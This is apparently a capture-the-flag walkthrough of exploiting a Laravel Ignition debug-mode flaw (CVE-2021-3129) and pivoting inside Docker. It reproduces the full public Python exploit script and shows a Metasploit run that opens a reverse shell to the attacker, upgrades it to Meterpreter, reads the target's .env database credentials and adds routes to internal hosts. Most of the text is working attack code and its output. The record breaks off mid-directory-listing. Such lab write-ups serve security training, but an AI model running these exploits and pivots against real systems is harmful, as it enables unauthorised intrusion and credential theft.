+Use the info command of the chosen Metasploit module (Format: CVE-xxxx-xxxx)
+```text
+┌──(kali㉿kali)-[~]
+└─$ searchsploit laravel      
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Aimeos Laravel ecommerce platform 2021.10 LTS - 'sort' SQL | php/webapps/50538.txt
+Laravel - 'Hash::make()' Password Truncation Security      | multiple/remote/39318.txt
+Laravel 8.4.2 debug mode - Remote code execution           | php/webapps/49424.py
+Laravel Administrator 4 - Unrestricted File Upload (Authen | php/webapps/49112.py
+Laravel Log Viewer < 0.13.0 - Local File Download          | php/webapps/44343.py
+Laravel Nova 3.7.0 - 'range' DoS                           | php/webapps/49198.txt
+Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)   | macos/local/50591.py
+PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross S | php/webapps/50525.txt
+PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unse | linux/remote/47129.rb
+UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read  | php/webapps/48166.txt
+UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary Fil | php/webapps/46389.py
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -m php/webapps/49424.py
+  Exploit: Laravel 8.4.2 debug mode - Remote code execution
+      URL: https://www.exploit-db.com/exploits/49424
+     Path: /usr/share/exploitdb/exploits/php/webapps/49424.py
+    Codes: CVE-2021-3129
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/49424.py
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat 49424.py
+```
+```text
+# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
+```
+```text
+# Date: 1.14.2021
+```
+```text
+# Exploit Author: SunCSR Team
+```
+```text
+# Vendor Homepage: https://laravel.com/
+```
+```text
+# References:
+```
+```text
+# https://www.ambionics.io/blog/laravel-debug-rce
+```
+```text
+# https://viblo.asia/p/6J3ZgN8PKmB
+```
+```text
+# Version: <= 8.4.2
+```
+```text
+# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
+```
+```text
+# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce
+
+#!/usr/bin/env python3
+
+import requests, sys, re, os
+
+header={
+    "Accept": "application/json"
+}
+
+data = {
+        "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",\
+        "parameters":{
+            "variableName":"cm0s",
+            "viewFile":""
+        }
+    }
+
+def clear_log(url='', viewFile=''):
+
+    global data
+
+    data['parameters']['viewFile'] = viewFile
+    while (requests.post(url=url, json=data, headers=header, verify=False).status_code != 200): pass
+    requests.post(url=url, json=data, headers=header, verify=False)
+    requests.post(url=url, json=data, headers=header, verify=False)
+
+def create_payload(url='', viewFile=''):
+
+    global data
+
+    data['parameters']['viewFile'] = viewFile
+    resp = requests.post(url=url, json=data, headers=header, verify=False)
+    if resp.status_code == 500 and f'file_get_contents({viewFile})' in resp.text:
+        return True
+    return False
+
+def convert(url='', viewFile=''):
+
+    global data
+
+    data['parameters']['viewFile'] = viewFile
+    resp = requests.post(url=url, json=data, headers=header, verify=False)
+    if resp.status_code == 200:
+        return True
+    return False
+
+def exploited(url='', viewFile=''):
+
+    global data
+
+    data['parameters']['viewFile'] = viewFile
+    resp = requests.post(url=url, json=data, headers=header, verify=False)
+    if resp.status_code == 500 and 'cannot be empty' in resp.text:
+        m = re.findall(r'\{(.|\n)+\}((.|\n)*)', resp.text)
+        print()
+        print(m[0][1])
+
+def generate_payload(command='', padding=0):
+    if '/' in command:
+        command = command.replace('/', '\/')
+        command = command.replace('\'', '\\\'')
+    os.system(r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt'''%(command))
+    payload = ''
+    with open('payload.txt', 'r') as fp:
+        payload = fp.read()
+        payload = payload.replace('==', '=3D=')
+        for i in range(padding):
+            payload += '=00'
+    os.system('rm -rf payload.txt')
+    return payload
+
+def main():
+
+    if len(sys.argv) < 4:
+        print('Usage:  %s url path-log command\n'%(sys.argv[0]))
+        print('\tEx: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log \'id\''%(sys.argv[0]))
+        exit(1)
+
+    if not os.path.isfile('./phpggc/phpggc'):
+        print('Phpggc not found!')
+        print('Run command: git clone https://github.com/ambionics/phpggc.git')
+        os.system('git clone https://github.com/ambionics/phpggc.git')
+
+    url = sys.argv[1]
+    path_log = sys.argv[2]
+    command = sys.argv[3]
+    padding = 0
+
+    payload = generate_payload(command, padding)
+    if not payload:
+        print('Generate payload error!')
+        exit(1)
+
+    if 'http' not in url and 'https' not in url:
+        url = 'http'+url
+    else:
+        url = url+'/_ignition/execute-solution'
+
+    print('\nExploit...')
+    clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
+    create_payload(url, 'AA')
+    create_payload(url, payload)
+    while (not convert(url, 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'%(path_log))):
+        clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
+        create_payload(url, 'AA')
+        padding += 1
+        payload = generate_payload(command, padding)
+        create_payload(url, payload)
+
+    exploited(url, 'phar://%s'%(path_log))
+
+if __name__ == '__main__':
+    main()    
+
+https://github.com/zhzyker/CVE-2021-3129
+```
+*CVE-2021-3129*
+What command can be used to upgrade the last opened session to a Meterpreter session?
+```text
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q
+```
+```text
+msf6 > search laravel
+
+Matching Modules
+================
+```
+```text
+#  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce
+```
+```text
+msf6 > use 1
+[*] Using configured payload cmd/unix/reverse_bash
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show options
+
+Module options (exploit/multi/php/ignition_laravel_debug_rce):
+
+   Name       Current Setting           Required  Description
+   ----       ---------------           --------  -----------
+   LOGFILE                              no        Laravel log file absolute path
+   Proxies                              no        A proxy chain of format type:host:port[,t
+                                                  ype:host:port][...]
+   RHOSTS                               yes       The target host(s), see https://github.co
+                                                  m/rapid7/metasploit-framework/wiki/Using-
+                                                  Metasploit
+   RPORT      80                        yes       The target port (TCP)
+   SSL        false                     no        Negotiate SSL/TLS for outgoing connection
+                                                  s
+   TARGETURI  /_ignition/execute-solut  yes       Ignition execute solution path
+              ion
+   VHOST                                no        HTTP server virtual host
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Unix (In-Memory)
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=10.10.117.214 lhost=10.8.19.103 HttpClientTimeout=20
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking component version to 10.10.117.214:80
+[+] The target appears to be vulnerable.
+[*] Command shell session 1 opened (10.8.19.103:4444 -> 10.10.117.214:60616) at 2022-12-18 22:39:13 -0500
+
+whoami
+www-data
+background
+
+Background session 1? [y/N]  y
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               10.8.19.103:4444 -> 10.10.117.214:60616 (10.10.117
+                                         .214)
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.8.19.103:4433 
+[*] Sending stage (1017704 bytes) to 10.10.117.214
+[*] Command stager progress: 100.00% (773/773 bytes)
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information  Connection
+  --  ----  ----                   -----------  ----------
+  1         shell cmd/unix                      10.8.19.103:4444 -> 10.10.117.214:60616 (10
+                                                .10.117.214)
+  2         meterpreter x86/linux               10.8.19.103:4433 -> 10.10.117.214:33308 (10
+                                                .10.117.214)
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > [*] Meterpreter session 2 opened (10.8.19.103:4433 -> 10.10.117.214:33308) at 2022-12-18 22:41:36 -0500
+
+[*] Stopping exploit/multi/handler
+```
+*sessions -u -1*
+What file indicates a session has been opened within a Docker container?
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.19.103:4444 -> 10.10.117.
+                                                             214:60616 (10.10.117.214)
+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.19.103:4433 -> 10.10.117.
+                                                             214:33308 (172.28.101.50)
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -i 2
+[*] Starting interaction with 2...
+```
+```text
+meterpreter > ls
+Listing: /var/www/html
+======================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  603   fil   2022-09-10 20:44:10 -0400  .htaccess
+100644/rw-r--r--  0     fil   2022-09-10 20:44:10 -0400  favicon.ico
+100644/rw-r--r--  1731  fil   2022-09-10 20:44:10 -0400  index.php
+100644/rw-r--r--  24    fil   2022-09-10 20:44:10 -0400  robots.txt
+100644/rw-r--r--  1194  fil   2022-09-10 20:44:10 -0400  web.config
+```
+```text
+meterpreter > cd ..
+```
+```text
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100644/rw-r--r--  868     fil   2022-09-12 13:08:52 -0400  .env
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  app
+100755/rwxr-xr-x  1686    fil   2022-09-10 20:44:10 -0400  artisan
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:59:46 -0400  bootstrap
+100644/rw-r--r--  1613    fil   2022-09-10 20:44:10 -0400  composer.json
+100644/rw-r--r--  247888  fil   2022-09-10 21:01:13 -0400  composer.lock
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  config
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  database
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  html
+100644/rw-r--r--  944     fil   2022-09-10 20:44:10 -0400  package.json
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  resources
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:55:46 -0400  routes
+100644/rw-r--r--  563     fil   2022-09-10 20:44:10 -0400  server.php
+040755/rwxr-xr-x  4096    dir   2022-09-13 12:59:46 -0400  storage
+040755/rwxr-xr-x  4096    dir   2022-09-13 13:04:52 -0400  vendor
+100644/rw-r--r--  559     fil   2022-09-10 21:14:21 -0400  webpack.mix.js
+```
+```text
+meterpreter > cat /var/www/.env
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=pgsql
+DB_HOST=webservice_database
+DB_PORT=5432
+DB_DATABASE=postgres
+DB_USERNAME=postgres
+DB_PASSWORD=postgres
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=null
+MAIL_FROM_NAME="${APP_NAME}"
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+```
+```text
+meterpreter > resolve webservice_database
+
+Host resolutions
+================
+
+    Hostname             IP Address
+    --------             ----------
+    webservice_database  172.28.101.51
+```
+```text
+meterpreter > background
+[*] Backgrounding session 3...
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
+[*] Route added
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
+[*] Route added
+```
+What IP is 172.17 0.1 docker?
+Listen to Connections in the Docker Network
+The bridge connection docker0 – with IP address 172.17. 0.1 – is **created by Docker at installation time**. Because the host and all containers are connected to that network, our application only needs to listen to it.
+```text
+meterpreter > cd /
+```
+```text
+meterpreter > pwd
+/
+```
+```text
+meterpreter > ls
+Listing: /
+==========
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  0     fil   2022-09-13 15:39:42 -0400  .dockerenv
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:51 -0400  bin
+040755/rwxr-xr-x  4096  dir   2022-09-03 08:10:00 -0400  boot
+040755/rwxr-xr-x  340   dir   2022-12-18 21:33:25 -0500  dev
+040755/rwxr-xr-x  4096  dir   2022-09-13 15:39:42 -0400  etc
+040755/rwxr-xr-x  4096  dir   2022-09-03 08:10:00 -0400  home
